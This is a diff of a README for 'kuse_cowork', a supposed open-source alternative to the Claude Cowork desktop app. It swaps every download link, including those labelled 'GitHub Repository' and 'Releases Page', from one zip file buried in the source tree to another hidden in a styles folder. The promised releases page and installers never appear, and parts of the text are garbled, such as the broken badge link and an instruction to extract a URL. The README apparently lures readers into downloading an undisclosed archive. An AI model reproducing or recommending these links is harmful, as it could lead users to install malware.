@@ -1,7 +1,7 @@
 # 🚀 kuse_cowork - Your Easy Way to Collaborate Online
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip%20Latest%https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)
+[![Download Latest Release](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip%20Latest%https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)
 
 ## 📖 Introduction
 Welcome to **kuse_cowork**! This is an open-source application designed to provide an alternative to the Claude Cowork Desktop App. This easy-to-use tool helps you manage your tasks and collaborate efficiently with your team. 
@@ -25,7 +25,7 @@ To start using **kuse_cowork**, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to our Releases page:
 
-   [Download Latest Release](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)
+   [Download Latest Release](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)
 
 2. **Find the Latest Version**: On the Releases page, look for the latest version. It will be marked clearly.
 
@@ -34,14 +34,14 @@ To start using **kuse_cowork**, follow these simple steps:
 4. **Install the Application**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For **macOS**: Open the downloaded `.dmg` file and drag the app to your Applications folder.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip` file and run the executable.
+   - For **Linux**: Extract the `https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip` file and run the executable.
 
 5. **Launch the Application**: Once installed, open **kuse_cowork** from your applications menu.
 
 ## 📂 Download & Install
 To download the application, visit this link:
 
-[Download Latest Release](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)
+[Download Latest Release](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)
 
 Follow the Getting Started instructions to install **kuse_cowork** on your device.
 
@@ -66,7 +66,7 @@ We welcome contributions from anyone interested in enhancing **kuse_cowork**! To
 4. Submit a pull request.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)
-- [Releases Page](https://raw.githubusercontent.com/sagar9105/kuse_cowork/main/src-tauri/src/kuse_cowork_v1.4.zip)
+- [GitHub Repository](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)
+- [Releases Page](https://github.com/sagar9105/kuse_cowork/raw/refs/heads/main/src/styles/cowork_kuse_v3.4.zip)
 
 Thank you for choosing **kuse_cowork**! We hope you find it helpful for your collaboration needs.
